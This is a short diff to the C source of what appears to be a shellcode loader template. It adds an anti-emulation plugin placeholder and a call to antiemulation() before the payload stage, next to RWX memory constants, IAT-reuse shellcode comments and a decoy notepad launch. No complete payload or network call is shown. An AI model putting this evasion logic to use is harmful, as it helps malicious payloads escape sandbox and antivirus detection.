@@ -8,6 +8,9 @@ char *supermega_payload;
 #define p_RX  0x20
 #define p_RWX 0x40
 
+
+{{plugin_antiemulation}}
+
 /* iat_reuse_rx
 
    Standard IAT reuse shellcode
@@ -28,6 +31,9 @@ int main()
 	if (mystrcmp(buffer, tocheck) != 0) { 
 		return 6;
 	}
+
+	// Depends on plugin_antiemulation
+	antiemulation();
 
 	// Decoy
 	//WinExec("C:\\windows\\system32\\notepad.exe", 1);
